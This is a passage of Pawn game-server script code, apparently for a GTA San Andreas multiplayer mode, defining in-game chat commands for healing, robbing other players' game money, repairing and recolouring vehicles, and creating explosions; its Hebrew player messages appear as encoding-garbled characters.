			if(!CanUseCommand(playerid)) return 1;
			if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .Єьщъ ьфщх· фхьъ °ть");
			SetPlayerSpecialAction(playerid,GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_PISSING ? SPECIAL_ACTION_NONE : SPECIAL_ACTION_PISSING);
		}
		if(equal(cmd,"/outcar"))
		{
			new id, string[M_S];
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс ыущ ьфЄщє ююЁх ∙чўя");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /outcar [id/name] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(id == playerid) return SendClientMessage(playerid,red," .рщЁъ щыхь ьфхЎщр р· ЄЎюъ юф°ыс ∙ьъ");
			switch(GetPlayerState(playerid))
			{
				case PLAYER_STATE_PASSENGER: SendClientMessage(playerid,red," .Єьщъ ьфщх· фЁфт сыущ ьфхЎщр ∙чўЁщэ юф°ыс");
				case PLAYER_STATE_DRIVER:
				{
					if(!IsPlayerInVehicle(id,GetPlayerVehicleID(playerid))) return SendClientMessage(playerid,red," .ф∙чўя ьр с°ыс ∙ьъ");
					RemovePlayerFromVehicle(id);
					format(string,sizeof(string)," .юф°ыс ∙ьъ %s фхЎр· р·",GetName(id));
					SendClientMessage(playerid,red,string);
					format(string,sizeof(string)," .фхЎщр рх·ъ юф°ыс ∙ьх %s",GetName(playerid));
					SendClientMessage(id,red,string);
				}
			}
		}
		if(equal(cmd,"/outcarall"))
		{
			new string[M_S], ids = 0;
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт с°ыс Єь юЁ· ьфхЎщр ююЁх ∙чўЁщэ");
			format(string,sizeof(string)," .фхЎщр р· ыь фЁхёЄщэ юф°ыс ∙ьх %s",GetName(playerid));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
			{
				RemovePlayerFromVehicle(i);
				SendClientMessage(i,red,string);
				ids++;
			}
			if(!ids) return SendClientMessage(playerid,red," .рщя ∙чўЁщэ с°ыс ∙ьъ");
		}
		if(equal(cmd,"/gmw"))
		{
		  	if(GetPlayerVirtualWorld(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(GetPlayerState(playerid) == PLAYER_STATE_WASTED) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх ыр∙° р·ф ю·");
			new id, string[M_S], wd[2], Float:p[3], weaps = 0;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /gmw [id/name] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(playerid == id) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
			if(!CanUseCommand(playerid)) return 1;
			if(GetPlayerInterior(id) > 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх сюўхэ фцф");
			GetPlayerPos(id,p[0],p[1],p[2]);
			if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 10.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс рь ф∙чўя рьщх р·ф °хЎф ь·· р· Ё∙ўщщъ");
			for(new i = 1; i < 13; i++)
			{
				GetPlayerWeaponData(playerid,i,wd[0],wd[1]);
				weaps++;
				if(wd[0] != 0 && wd[1] != 0) GiveWeapon(id,wd[0],wd[1]);
			}
			if(!weaps) return SendClientMessage(playerid,red," .рщя ьъ Ё∙ўщэ");
			ResetWeapons(playerid);
			format(string,sizeof(string)," .%s Ё·· р· ыь Ё∙ўщщъ ь",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .Ё·я ьъ р· ыь фЁ∙ўщэ ∙ьх %s",GetName(playerid));
			SendClientMessage(id,green,string);
		}
		if(equal(cmd,"/rob"))
		{
			new id, string[M_S], Float:p[3], amount = 0, lvl = lcmdid("/rob",1);
			cmd = strtok(cmdtext,idx);
			if(!playerinfo[playerid][canrob]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /rob [id/name] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(playerid == id) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
			if(!CanUseCommand(playerid)) return 1;
			if(GetPlayerVirtualWorld(playerid) != 0 || GetPlayerInterior(playerid) != 0 || GetPlayerInterior(id) > 0 || GetPlayerVirtualWorld(id) != GetPlayerVirtualWorld(playerid) || IsPlayerAFK_(id) || GetPlayerState(id) != PLAYER_STATE_ONFOOT || IsPlayerInCheckpoint(id)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх Єь ∙чўя цф");
			GetPlayerPos(id,p[0],p[1],p[2]);
			if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 10.0) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс рь ф∙чўя ∙р·ф °хЎф ьтЁхс ююЁх ыёє");
			amount = randomEx(10*playerinfo[playerid][upgradecmd][lvl],15*playerinfo[playerid][upgradecmd][lvl]);
			if(amount > GetMoney(id)) amount = GetMoney(id);
			if(!amount) return SendClientMessage(playerid,red," .ь∙чўя цф рщя ыёє");
			GiveMoney(id,0-amount, 17);
			GiveMoney(playerid,amount, 17);
			format(string,sizeof(string)," !%s тЁс· $%d ю",GetName(id),amount);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," !тЁс ююъ $%d %s",amount,GetName(playerid));
			SendClientMessage(id,red,string);
			playerinfo[playerid][canrob] = 0;
			SetTimerEx("CanRob",15000,0,"d",playerid);
		}
		if(equal(cmd,"/healme") || equal(cmd,"/heal") || equal(cmd,"/hm"))
		{
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact] || playerinfo[playerid][waitewar]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
            if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red,".ьр Ёщ·я ьсЎЄ Їўхуф цр· ∙р·ф сў°с");
			if(CheckIfCommandUsed(playerid,0)) return 1;
			switch(playerinfo[playerid][upgradecmd][lcmdid("/healme",1)])
			{
				case 1: SetPlayerHealth(playerid,100.0);
				case 2:
				{
					new Float:h;
					GetPlayerHealth(playerid,h);
					if(h >= 100.0) SetPlayerArmour(playerid,100.0);
					else SetPlayerHealth(playerid,100.0);
				}
				case 3:
				{
					SetPlayerHealth(playerid,100.0);
					SetPlayerArmour(playerid,100.0);
				}
			}
			SendClientMessage(playerid,green," .°щЇщ· р· ЄЎюъ");
			SetPlayerChatBubble(playerid,"/HealMe used",darkblue,20.0,3000);
		}
		if(equal(cmd,"/healhim") || equal(cmd,"/hh"))
		{
			new id, string[M_S], Float:p[3];
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /healhim [id/name] :Ўх°· ф∙щюх∙");
			id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			GetPlayerPos(id,p[0],p[1],p[2]);
			if(GetPlayerDistanceToPointEx(playerid,p[0],p[1],p[2]) > 10.0) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс рь ф∙чўя рх·х р·ф °хЎф ь°Їр");
            if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,red,".ф∙чўя ЁюЎр сЄхьэ рч°");
			if(CheckIfCommandUsed(playerid,0)) return 1;
			switch(playerinfo[playerid][upgradecmd][lcmdid("/healme",1)])
			{
				case 1: SetPlayerHealth(id,100.0);
				case 2:
				{
					new Float:h;
					GetPlayerHealth(id,h);
					if(h >= 100.0) SetPlayerArmour(id,100.0);
					else SetPlayerHealth(id,100.0);
				}
				case 3:
				{
					SetPlayerHealth(id,100.0);
					SetPlayerArmour(id,100.0);
				}
			}
			format(string,sizeof(string),"/HealHim used\n(Healed by %s)",GetName(playerid));
			SetPlayerChatBubble(id,string,darkblue,20.0,3000);
			format(string,sizeof(string)," .%s °щЇщ· р·",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .°щЇр рх·ъ %s",GetName(playerid));
			SendClientMessage(id,green,string);
		}
		if(equal(cmd,"/healus") || equal(cmd,"/hu"))
		{
			new string[M_S], Float:p[3];
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			if(CheckIfCommandUsed(playerid,0)) return 1;
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			format(string,sizeof(string)," .ющьр р· фчщщэ ∙ьъ %s",GetName(playerid));
			switch(playerinfo[playerid][upgradecmd][lcmdid("/healus",1)])
			{
				case 1:
				{
					for(new id = 0; id < MAX_PLAYERS_; id++) if(IsPlayerConnected(id) && GetDistanceBetweenPlayers(playerid,id) <= 2.5 && GetPlayerVirtualWorld(id) == GetPlayerVirtualWorld(playerid) && GetPlayerInterior(id) == GetPlayerInterior(playerid))
					{
						SetPlayerHealth(id,100.0);
						if(id != playerid) SendClientMessage(id,green,string);
					}
				}
				case 2:
				{
					for(new id = 0; id < MAX_PLAYERS_; id++) if(IsPlayerConnected(id) && GetDistanceBetweenPlayers(playerid,id) <= 3.0 && GetPlayerVirtualWorld(id) == GetPlayerVirtualWorld(playerid) && GetPlayerInterior(id) == GetPlayerInterior(playerid))
					{
						new Float:h;
						GetPlayerHealth(id,h);
						if(h >= 100.0) SetPlayerArmour(id,100.0);
						else SetPlayerHealth(id,100.0);
						if(id != playerid) SendClientMessage(id,green,string);
					}
				}
				case 3:
				{
					for(new id = 0; id < MAX_PLAYERS_; id++) if(IsPlayerConnected(id) && GetDistanceBetweenPlayers(playerid,id) <= 5.0 && GetPlayerVirtualWorld(id) == GetPlayerVirtualWorld(playerid) && GetPlayerInterior(id) == GetPlayerInterior(playerid))
					{
						SetPlayerHealth(id,100.0);
						SetPlayerArmour(id,100.0);
						if(id != playerid) SendClientMessage(id,green,string);
					}
				}
			}
			SendClientMessage(playerid,green," .ющьр· р· фчщщэ ь∙чўЁщэ фў°хсщэ рьщъ");
		}
		if(equal(cmd,"/flip"))
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс сыущ ьфЇхъ рх·х");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(!IsVehicleUpsideDown(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid,red," .щ∙ ьф∙·ю∙ с°ыс сЇўхуф цх °ў ыр∙° ф°ыс фЇхъ");
			new Float:za;
			GetVehicleZAngle(GetPlayerVehicleID(playerid),za);
			SetVehicleZAngle(GetPlayerVehicleID(playerid),za);
			SendClientMessage(playerid,green," .ф°ыс ∙ьъ ф·фЇъ");
			PlaySound(playerid,1133);
		}
		if(equal(cmd,"/fix") || equal(cmd,"/vr"))
		{
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс сыущ ь·ўя рх·х");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ Їўхуф цх сюЁхє");
			if(IsPlayerInHQ(playerid)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			if(playerinfo[playerid][admin] < 6 && CheckIfCommandUsed(playerid,1,true)) return 1;
            if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			new lvl = lcmdid("/fix",1), v = GetPlayerVehicleID(playerid);
			if(playerinfo[playerid][upgradecmd][lvl] == 2) RepairVehicle(v);
			SetVehicleHealth(v,GetVehicleMHealth(GetVehicleModel(v)));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,v))
			{
				PlaySound(i,1133);
				SendClientMessage(i,green," .ф°ыс ∙ьъ ·хўя");
			}
			if(!playerinfo[playerid][noticedmsg][2] && playerinfo[playerid][upgradecmd][lvl] < 2)
			{
				SendClientMessage(playerid,grey," /lcmds :юф·Ї°щш фср /fix °хЎф ∙ф°ыс ∙ьъ щ·хўя сЎх°ф щх·° рЇўшщсщ· хшхсф? ∙у°т р· фЇўхуф");
				playerinfo[playerid][noticedmsg][2] = 1;
			}
		}
		if(equal(cmd,"/vcolor") || equal(cmd,"/vc"))
		{
			new c1, c2, v, ulvl = playerinfo[playerid][upgradecmd][lcmdid("/vcolor",1)];
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс сыущ ь∙Ёх· р· ЎсЄх");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /vcolor [0 - 255] [0 - 255] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,white," /vcolor r :Ўх°· ф∙щюх∙ - фЎсЄ фф·чь·щ / ф∙юх° ∙ь ф°ыс");
				SendClientMessage(playerid,white," /vcolor n :Ўх°· ф∙щюх∙ - ЎсЄ фс°щ°· ючуь ь°ыс");
				if(ulvl >= 2) SendClientMessage(playerid,white," /vcolor s [1-10] :Ўх°· ф∙щюх∙ - ЎсЄ ющхчу");
				if(ulvl >= 3) SendClientMessage(playerid,white," /vcolor c :Ўх°· ф∙щюх∙ - ЎсЄщэ ю∙·Ёщэ");
				return 1;
			}
			if(IsNumeric(cmd))
			{
				c1 = strval(cmd), cmd = strtok(cmdtext,idx), c2 = !strlen(cmd) || !IsNumeric(cmd) ? c1 : strval(cmd);
				if(c1 < 0 || c1 > 255 || c2 < 0 || c2 > 255) return SendClientMessage(playerid,red," .рчу фЎсЄщэ ∙тхщ");
			}
			else
			{
				if(equal(cmd,"r")) c1 = vehicleinfo[GetPlayerVehicleID(playerid)][vcol][0], c2 = vehicleinfo[GetPlayerVehicleID(playerid)][vcol][1];
				else if(equal(cmd,"n")) c1 = -1, c2 = -1;
				else if(equal(cmd,"s"))
				{
					if(ulvl < 2) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ ЇЄхьф цх");
					cmd = strtok(cmdtext,idx);
					if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /vcolor s [1-7] :Ўх°· ф∙щюх∙ - ЎсЄ ющхчу");
					new sid = strval(cmd);
					switch(sid)
					{
						case 1: c1 = 131, c2 = 132;
						case 2: c1 = 149, c2 = 186;
						case 3: c1 = 142, c2 = 144;
						case 4: c1 = 155, c2 = 156;
						case 5: c1 = 236, c2 = 251;
						case 6: c1 = 146, c2 = 252;
						case 7: c1 = 252, c2 = 244;
						case 8: c1 = 182, c2 = 184;
						case 9: c1 = 130, c2 = 131;
						case 10: c1 = 166, c2 = 151;
						default: return SendClientMessage(playerid,red," .ЎсЄ ющхчу ∙тхщ");
					}
				}
				else if(equal(cmd,"c"))
				{
					if(ulvl < 3) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ ЇЄхьф цх");
					playerinfo[playerid][cvcolor] = !playerinfo[playerid][cvcolor];
					SendClientMessage(playerid,playerinfo[playerid][cvcolor] ? green : red,playerinfo[playerid][cvcolor] ? (" .юЎс ЎсЄщ °ыс ю·чьЇщэ фхЇЄь") : (" .юЎс ЎсЄщ °ыс ю·чьЇщэ фхЇёў"));
				}
				else return SendClientMessage(playerid,red," .рЇ∙°х· ЎсЄ °ыс ∙тхщф");
			}
			v = GetPlayerVehicleID(playerid);
			ChangeVehicleColor(v,c1,c2);
			vehicleinfo[v][newvcol][0] = c1, vehicleinfo[v][newvcol][1] = c2;
			PlaySound(playerid,1134);
		}
		if(equal(cmd,"/boome") || equal(cmd,"/bme"))
		{
			if(!CanUseCommand(playerid)) return 1;
			if(CheckIfCommandUsed(playerid,2,false)) return 1;
			if(GetPlayerInterior(playerid) != 0 || GetPlayerCheckpoint(playerid) != cp_none) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(GetPlayerState(playerid) == PLAYER_STATE_WASTED) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх ыр∙° р·ф ю·");
			new Float:h, Float:a, Float:p[3];
			GetPlayerHealth(playerid,h);
			GetPlayerArmour(playerid,a);
			if(floatadd(h,a) <= 80.0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сюЎс фчщщэ фЁхычщ ∙ьъ");
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			if(p[2] >= 800.0) return SendClientMessage(playerid,red," .рщ рЇ∙° ьф·ЇхЎї стхсф ыцф");
			switch(playerinfo[playerid][upgradecmd][lcmdid("/boome",1)])
			{
				case 1: CreateExplosionVW(p[0],p[1],p[2],12,0.1,GetPlayerVirtualWorld(playerid));
				case 2: CreateExplosionVW(p[0],p[1],p[2],6,0.1,GetPlayerVirtualWorld(playerid));
				case 3: CreateExplosionVW(p[0],p[1],p[2],7,0.1,GetPlayerVirtualWorld(playerid));
			}
			if(IsPlayerDead(playerid)) playerinfo[playerid][usedkill] = 1;
			SetPlayerHealth(playerid,h);
			SetPlayerArmour(playerid,a);
			playerinfo[playerid][death][2] = 1;
		}
		if(equal(cmd,"/boom") || equal(cmd,"/bm"))
		{
			new Float:p[3];
			if(!CanUseCommand(playerid)) return 1;
			if(CheckIfCommandUsed(playerid,2,false)) return 1;
			if(GetPlayerInterior(playerid) != 0 || GetPlayerCheckpoint(playerid) != cp_none) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(IsPlayerInRangeOfPoint(playerid,50.0,285.2316,-1606.2344,114.4163)) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(GetPlayerState(playerid) == PLAYER_STATE_WASTED) return SendClientMessage(playerid,red," .ьр Ёщ·я ьсЎЄ р· фЇўхуф фцх ыр∙° р·ф ю·");
			if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			if(p[2] >= 800.0) return SendClientMessage(playerid,red," .рщ рЇ∙° ьф·ЇхЎї стхсф ыцф");
			CreateExplosionVW(p[0],p[1],p[2],playerinfo[playerid][upgradecmd][lcmdid("/boom",1)] >= 2 ? 7 : 6,playerinfo[playerid][upgradecmd][lcmdid("/boom",1)] >= 3 ? 0.3 : 0.1,GetPlayerVirtualWorld(playerid));
			if(IsPlayerDead(playerid)) playerinfo[playerid][usedkill] = 1;
			playerinfo[playerid][death][2] = 1;
		}
		if(equal(cmd,"/ppill"))
		{
			if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇЄхьф фцх сюЎсъ фЁхычщ");
			if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			if(!CanUseCommand(playerid)) return 1;
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			playerinfo[playerid][slow] = CreatePickupEx(1241,15,p[0],p[1],p[2]);
			SetTimerEx("DestroyPickup2",1000,0,"i",playerinfo[playerid][slow]);
		}
		if(equal(cmd,"/setfire"))
		{
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid, red, " .рщя рЇ∙°х· ьф∙·ю∙ сЇўхуф цх срюЎЄ ў°с");
			if(GetPlayerInterior(playerid) != 0 || GetPlayerCheckpoint(playerid) != cp_none) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			new Float:p[3], Float:setp = 10.0, vw = GetPlayerVirtualWorld(playerid);
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			if(playerinfo[playerid][upgradecmd][lcmdid("/setfire",1)] == 2)
			{
				for(new i = 0; i < 3; i++)
				{
					GetXYInFrontOfPlayer(playerid,p[0],p[1],setp);
					CreateExplosionVW(p[0],p[1],p[2],9,2,vw);
					CreateExplosionVW(p[0],p[1],p[2],randomEx(4,6),5,vw);
					setp += 8.5;
				}
			}
			else
			{
				GetXYInFrontOfPlayer(playerid,p[0],p[1],setp);
				CreateExplosionVW(p[0],p[1],p[2],9,2,vw);
				CreateExplosionVW(p[0],p[1],p[2],randomEx(4,6),5,vw);
			}
		}
		if(equal(cmd,"/bigbang"))
		{
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			if(GetPlayerInterior(playerid) != 0 || GetPlayerCheckpoint(playerid) != cp_none) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
			if(GetPlayerHQ(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх сюЇўух· ўьрЁщэ");
			new Float:p[3], vw = GetPlayerVirtualWorld(playerid);
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			if(playerinfo[playerid][upgradecmd][lcmdid("/bigbang",1)] == 2)
			{
				CreateExplosionVW(p[0]+5.0,p[1],p[2],12,7.5,vw);
				CreateExplosionVW(p[0]+10.0,p[1],p[2],12,7.5,vw);
				CreateExplosionVW(p[0],p[1]+5.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0],p[1]+10.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]+5.0,p[1]+10.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]+10.0,p[1]+5.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]-5.0,p[1],p[2],12,7.5,vw);
				CreateExplosionVW(p[0]-10.0,p[1],p[2],12,7.5,vw);
				CreateExplosionVW(p[0],p[1]-5.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0],p[1]-10.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]-5.0,p[1]-10.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]-10.0,p[1]-5.0,p[2],12,7.5,vw);
				CreateExplosionVW(p[0]+5.0,p[1],p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0]+10.0,p[1],p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0],p[1]+5.0,p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0],p[1]+10.0,p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0]+5.0,p[1]+10.0,p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0]+10.0,p[1]+5.0,p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0]-5.0,p[1],p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0]-10.0,p[1],p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0],p[1]-5.0,p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0],p[1]-10.0,p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0]-5.0,p[1]-10.0,p[2]+5.0,12,7.5,vw);
				CreateExplosionVW(p[0]-10.0,p[1]-5.0,p[2]+5.0,12,7.5,vw);
			}
			else
			{
